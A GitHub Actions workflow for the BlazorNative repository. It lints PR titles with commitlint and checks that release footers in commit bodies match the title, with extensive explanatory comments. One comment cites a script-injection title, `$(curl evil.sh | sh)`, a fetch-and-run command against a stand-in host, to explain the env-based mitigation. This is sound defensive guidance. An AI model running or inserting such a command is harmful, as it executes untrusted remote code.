# ─────────────────────────────────────────────────────────────────────────────
# BlazorNative COMMITLINT (Phase 8.6, decision 5) — the PR title is the commit
# subject, and this is the only thing that reads it before main does.
#
# WHAT IT LINTS: the PR TITLE. Not the branch's commits — this repo squash-merges,
# so those SUBJECTS are DISCARDED and never reach main or release-please. Linting
# text that is thrown away would red PRs for honest WIP commits and prove nothing.
#
# ⚠ THAT IS TRUE OF THE SUBJECTS AND FALSE OF THE BODIES, and the difference is
# not academic (Phase 8.6 Gate 2). `squash_merge_commit_message` is
# COMMIT_MESSAGES, so the branch's WHY BODIES CONCATENATE INTO MAIN'S BODY and
# release-please parses them. A FOOTER TOKEN AT COLUMN 0 IS A FOOTER even when
# the sentence around it is prose explaining the mechanism — and this repo's
# house style is long bodies that discuss exactly that mechanism.
#
# IT ALREADY HAPPENED, in the very commit that installed this contract (004179f):
# its body wrapped at 80 columns, which pushed the breaking-change token to
# column 0 in front of the word "footers." A real --dry-run caught it proposing
#
#     ### ⚠ BREAKING CHANGES
#     * **release:** footers.
#
# into the 1.0.0-preview.2 changelog and Release body. THE LINE WRAP DECLARED A
# BREAKING CHANGE. Nothing linted it, because this file lints the title.
#
# SO THE "NEVER A WRONG VERSION" CLAIM BELOW IS EXACT ABOUT THE SUBJECT AND
# MUST NOT BE STRETCHED OVER THE BODY: a body's `Release-As:` footer, at column 0
# in the message's LAST paragraph, sets the released version outright and
# short-circuits the whole ladder. See .commitlintrc.yml's header for the
# measured boundary and the rule (name the thing, do not spell it — in a BODY;
# spelling it in a file like this one is safe, because only commit MESSAGES are
# parsed). A body-level check is a real option, is NOT what decision 5 refused,
# and is ledgered rather than taken here.
#
# ADVISORY BY DESIGN — THIS IS NOT A FOURTH REQUIRED CHECK. The three required
# gates keep their names and contexts: `build-test`, `android-build`, `ios-build`.
# 8.2 set this precedent for release.yml and the reasoning is the same here.
#
# THE HONEST CONSEQUENCE, stated rather than hidden: A MIS-TITLED PR CAN MERGE,
# and release-please will silently ignore it — no changelog line, no bump
# contribution. That failure is A MISSING CHANGELOG ENTRY, NEVER A WRONG VERSION,
# and that is not a hope — it is measured: at 1.0.0-preview.N, `fix:`, `feat:`
# and `feat!:` all produce preview.N+1, so the commit TYPE cannot move the
# version at all (see .github/workflows/release-please.yml). The blast radius of
# a mis-typed subject is a changelog section. That is what makes advisory safe
# here, and it would not be safe in a repo where the type computed the version.
#
# Promoting this to required is the owner's call and a branch-protection change.
# It is not taken here.
#
# ✅ THE THING THAT MAKES THIS LINT SOUND IS NOT IN THIS FILE — AND IT IS DONE.
#
#    squash_merge_commit_title is `PR_TITLE` on this repository as of 2026-07-17
#    (the owner set it; verified in the API response). So the title this workflow
#    lints IS the subject that lands on main and that release-please parses.
#    THIS GATE IS LOAD-BEARING.
#
#    IT USED TO BE `COMMIT_OR_PR_TITLE`, which meant a SINGLE-COMMIT PR used the
#    COMMIT's subject and IGNORED the title — this workflow could go green on
#    `feat(runtime): …` while `wip` landed on main. Sound-looking and not sound,
#    for most PRs. That is why the setting was step 1 of Phase 8.6's sequence,
#    ahead of this file existing: the lint was never allowed to be decorative.
#
#    ⚠ NOTHING IN THIS REPO PINS IT. It is a repository setting, not a file in
#    this tree, so no test reds if it is set back. It is named here, in the file
#    it would undermine, rather than in a design doc, because this is where
#    someone debugging "why did `wip` reach main?" will be standing. Check it:
#
#      gh api repos/MarcelRoozekrans/BlazorNative \
#        --jq '{t: .squash_merge_commit_title, m: .squash_merge_commit_message}'
#
#    Restore it:
#
#      gh api -X PATCH repos/MarcelRoozekrans/BlazorNative \
#        -f squash_merge_commit_title=PR_TITLE \
#        -f squash_merge_commit_message=COMMIT_MESSAGES
#
# NO SECOND COPY OF THE ENUMS. `.commitlintrc.yml` is the ONE authority.
# `amannn/action-semantic-pull-request` — the obvious action for this job — was
# rejected for exactly that: its `types:`/`scopes:` inputs would be a second copy
# of the lists, which is 8.1 normative rule 2's sin and the reason this repo
# deleted a roster in the first place. So this pipes the title into commitlint
# itself.
#
# ─────────────────────────────────────────────────────────────────────────────
# ✅ AND THE BODIES ARE NOW READ TOO — by the SECOND job below (Gate 3).
#
# Everything above explains why the TITLE is linted and the branch's SUBJECTS
# are not. That reasoning is untouched and still right. What it did NOT cover is
# the BODIES, which DO reach main and ARE parsed — the half-truth Gate 2 found
# the hard way. `footer-check` is the job that closes it. The rule it enforces:
#
#     A PR's commit BODIES may declare a release footer only if the PR's TITLE
#     declares the same thing.
#
# It does not ask whether you meant it — it cannot know. It asks whether the two
# texts you wrote AGREE. See scripts/footer-check.ps1 for the measured boundary
# (leading spaces, tabs, list bullets and lowercase all fail to save a token —
# "column 0" is the wrong mental model) and for its 14-row self-test.
#
# See docs/plans/2026-07-17-phase-8.6-design.md, decisions 5 and 6.
# ─────────────────────────────────────────────────────────────────────────────
name: commitlint

on:
  pull_request:
    # `edited` is load-bearing and easy to leave out: without it, fixing a bad
    # title would never re-run this check, and the PR would keep the stale red.
    # It is load-bearing TWICE over now: `footer-check` compares the bodies
    # against the TITLE, so an edited title changes that job's answer too.
    types: [opened, edited, synchronize, reopened]

permissions:
  contents: read
  # footer-check reads the PR's commit list. Read-only, and it is the whole
  # reason this lane is the natural home: it already has the PR in hand.
  pull-requests: read

jobs:
  pr-title:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-node@v7
        with:
          node-version: 22

      - name: Install commitlint
        run: npm install --no-save @commitlint/cli@21 @commitlint/config-conventional@21

      # THE TITLE ARRIVES VIA env, NOT VIA A ${{ }} INTERPOLATION INTO THE SHELL.
      # A PR title is attacker-controlled text from anyone who can open a PR;
      # interpolating it directly into a `run:` block is script injection —
      # a title of `$(curl evil.sh | sh)` would execute. env: is the documented
      # mitigation, and it costs nothing.
      - name: Lint the PR title (it IS the commit subject)
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Linting PR title: $PR_TITLE"
          printf '%s' "$PR_TITLE" | npx commitlint --config .commitlintrc.yml

  # ───────────────────────────────────────────────────────────────────────────
  # THE FOOTER CHECK — the job that reads the surface nothing read before it
  # landed. A SEPARATE job, deliberately: it answers a different question from
  # the title lint, and when it reds the reader should see WHICH question failed
  # without opening a log. `pr-title` red = your title is malformed.
  # `footer-check` red = your body says something your title does not.
  #
  # THE DECISION LIVES IN THE SCRIPT, NOT HERE. That is the house rule, stated
  # in release.yml for the same reason: YAML that fires on one event is the
  # least testable code in the repo. scripts/footer-check.ps1 carries a 14-row
  # -SelfTest whose first row is 004179f's REAL body, and it is run below —
  # BEFORE the check itself, so a broken check reds as a broken check rather
  # than passing vacuously over a poisoned body.
  # ───────────────────────────────────────────────────────────────────────────
  footer-check:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v7

      # THE POSITIVE CONTROL, and it runs first ON PURPOSE. This repo's standing
      # rule — a pin that cannot see its subject must never pass vacuously —
      # applies to the pin's own logic too. If the table cannot prove the check
      # catches 004179f, the check does not get to render a verdict on anything.
      - name: The check's own self-test (14 rows, 004179f's real body is row 1)
        shell: pwsh
        run: |
          ./scripts/footer-check.ps1 -SelfTest
          if ($LASTEXITCODE -ne 0) { throw "footer-check -SelfTest failed (exit $LASTEXITCODE) — the check is broken; it does not get to judge a PR." }

      # The title arrives via env, never via a ${{ }} interpolation into the
      # shell — same reasoning as the lint step above: a PR title is
      # attacker-controlled text from anyone who can open a PR.
      - name: The bodies must agree with the title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          REPO: ${{ github.repository }}
        shell: bash
        run: |
          set -euo pipefail
          # --paginate is not optional: the endpoint pages at 30, and a PR with
          # 31 commits would otherwise be judged on the first 30 and pass on the
          # strength of the commits it happened to read.
          #
          # `| @json` then `jq -s` and NOT `--jq '[.[].commit.message]'`, for two
          # reasons that are each enough on their own — both RUN, not assumed:
          #   1. WITH --paginate, --jq RUNS PER PAGE — a 2-page PR emits two
          #      concatenated arrays, `[…][…]`. That is a JSON *stream*, not a
          #      JSON *document*: jq reads it happily, which is exactly what
          #      makes it easy to ship. ConvertFrom-Json throws on it —
          #      "Additional text encountered after finished reading JSON
          #      content" — so it fails LOUD rather than judging page 1 only.
          #      Loud is good; not shipping the trip-wire at all is better.
          #   2. gh prints a jq string result RAW, and commit messages are
          #      MULTI-LINE — so one-message-per-line is not a parseable shape
          #      at any page count. This one bites even on a 1-page PR.
          # `@json` re-encodes each message to a single-line JSON string; `jq -s`
          # slurps those lines into one array. Both problems, one mechanism.
          gh api "repos/$REPO/pulls/$PR_NUMBER/commits" --paginate \
            --jq '.[].commit.message | @json' > /tmp/pr-commits.jsonl
          jq -s '.' /tmp/pr-commits.jsonl > /tmp/pr-commits.json
          # A failed fetch lands here as an empty array; footer-check.ps1 throws
          # on that rather than passing vacuously over zero commits.
          pwsh ./scripts/footer-check.ps1 -Title "$PR_TITLE" -CommitMessagesJson /tmp/pr-commits.json
